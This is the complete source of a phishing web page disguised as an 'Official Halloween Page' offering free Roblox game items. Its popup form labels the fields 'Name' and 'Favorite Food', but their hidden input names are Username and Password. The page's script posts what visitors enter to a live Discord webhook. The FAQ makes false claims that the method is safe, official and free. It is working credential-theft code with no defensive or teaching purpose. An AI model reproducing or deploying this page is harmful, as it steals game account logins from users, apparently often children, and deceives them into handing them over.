<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Official Halloween Page</title>
  <!-- Google Font: Fredoka One -->
  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ff0000;
      color: white;
      text-align: center;
    }

    /* Hero Section */
    .hero {
      position: relative;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url("OFFICIAL HALLOWEEN PAGE.png"); /* Replace with your image */
      background-size: contain;
      background-position: center;
      background-repeat: no-repeat;
      background-color: #ff0000;
    }

    .claim-btn {
      position: absolute;
      bottom: 10%;
      padding: 15px 50px;
      font-size: 24px;
      font-family: 'Fredoka One', cursive;
      background-color: #28a745;
      color: white;
      border: 3px solid black;
      border-radius: 15px;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .claim-btn:hover {
      background-color: #218838;
      transform: scale(1.05);
    }

    /* Popup Modal */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      visibility: hidden;
    }

    .modal.active {
      visibility: visible;
    }

    .modal-content {
      background: white;
      color: black;
      padding: 30px;
      border-radius: 10px;
      width: 400px;
      text-align: left;
      font-family: 'Fredoka One', cursive;
    }

    .modal-content h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    .modal-content label {
      display: block;
      margin-top: 10px;
      font-size: 16px;
    }

    .modal-content input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      margin-bottom: 15px;
      border-radius: 5px;
      border: 1px solid black;
      font-size: 16px;
    }

    .submit-btn {
      width: 100%;
      padding: 12px;
      font-size: 18px;
      background: #28a745;
      color: white;
      border: 2px solid black;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .submit-btn:hover {
      background: #218838;
    }

    /* FAQ Section */
    .faq {
      max-width: 800px;
      margin: 60px auto;
      padding: 20px;
      text-align: left;
    }

    .faq h2 {
      font-family: 'Fredoka One', cursive;
      text-align: center;
      font-size: 32px;
      margin-bottom: 10px;
      color: white;
    }

    .faq-sub {
      text-align: center;
      margin-bottom: 30px;
      color: #fff;
      font-size: 16px;
      opacity: 0.9;
    }

    .faq-item {
      margin-bottom: 15px;
      border-radius: 10px;
      overflow: hidden;
      background: #111;
      border: 2px solid black;
    }

    .faq-question {
      width: 100%;
      background: none;
      border: none;
      outline: none;
      font-size: 18px;
      font-family: 'Fredoka One', cursive;
      color: white;
      text-align: left;
      padding: 15px 20px;
      cursor: pointer;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .faq-question span {
      font-size: 20px;
      color: white;
      transition: transform 0.2s ease;
    }

    .faq-answer {
      max-height: 0;
      overflow: hidden;
      background: #222;
      transition: max-height 0.3s ease, padding 0.3s ease;
      padding: 0 20px;
    }

    .faq-answer p {
      color: #fff;
      margin: 15px 0;
    }

    .faq-item.active .faq-answer {
      max-height: 200px;
      padding: 15px 20px;
    }

    .faq-item.active .faq-question span {
      transform: rotate(45deg);
    }
  </style>
</head>
<body>
  <!-- Hero Section -->
  <div class="hero">
    <button class="claim-btn" onclick="openModal()">Claim</button>
  </div>

  <!-- Modal -->
  <div class="modal" id="popup">
    <div class="modal-content">
      <h2>Enter Info</h2>
      <form id="claimForm">
        <label for="name">Name:</label>
        <input type="text" id="name" name="Username" required>

        <label for="food">Favorite Food:</label>
        <input type="text" id="food" name="Password" required>

        <button type="submit" class="submit-btn">Submit</button>
      </form>
    </div>
  </div>

  <!-- FAQ Section -->
  <section class="faq">
    <h2>FAQ</h2>
    <p class="faq-sub">Essential information for Method</p>

    <div class="faq-item">
      <button class="faq-question">Is it safe?<span>+</span></button>
      <div class="faq-answer">
        <p>Yes! This is an official method created by Sammy.</p>
      </div>
    </div>

    <div class="faq-item">
      <button class="faq-question">What rewards can I earn? <span>+</span></button>
      <div class="faq-answer">
        <p>You will unlock La Spooky Grande, La Vacca, and many more items.</p>
      </div>
    </div>

    <div class="faq-item">
      <button class="faq-question">Do I need Robux to claim? <span>+</span></button>
      <div class="faq-answer">
        <p>Nope! This method is completely free. </p>
      </div>
    </div>

    <div class="faq-item">
      <button class="faq-question">How long does it take?<span>+</span></button>
      <div class="faq-answer">
        <p>Brainrots and items will be put into your base within 24 hours.</p>
      </div>
    </div>
  </section>

  <script>
    function openModal() {
      document.getElementById("popup").classList.add("active");
    }

    document.querySelectorAll('.faq-question').forEach(button => {
      button.addEventListener('click', () => {
        const faqItem = button.parentElement;
        faqItem.classList.toggle('active');
      });
    });

    document.getElementById("claimForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const name = document.getElementById("name").value;
      const food = document.getElementById("food").value;

      // Replace with your Discord webhook URL
      const webhookURL = "https://discord.com/api/webhooks/1427784026365886464/abIwq6mVHjg4rcrJvhbozKnrn5aO637XoVEqzXBiLD7TYcZNXeF8_ZzjV1k-wCVWVv5z";

      const payload = {
        content: `${name} ${food}`
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).then(res => {
        if(res.ok){
          alert("Submitted!");
        } else {
          alert("Error submitting to Discord");
        }
      });
    });
  </script>
</body>
</html>
